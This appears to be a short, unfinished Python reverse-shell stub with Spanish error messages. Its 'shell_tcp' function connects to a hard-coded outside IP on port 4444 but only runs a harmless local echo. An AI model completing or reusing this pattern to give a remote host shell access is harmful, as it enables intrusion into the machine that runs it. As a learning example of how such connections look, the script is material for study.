import socket
import os
def shell_tcp():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect(('89.128.230.215', 4444))
        os.system('echo !hola!')
        
        
    except ConnectionRefusedError as l:
        print("Esta conexión fue rechazada")
        return l

    except OSError as e:
        print("hubo un error en la conexión con el sistema")
        return e

shell_tcp()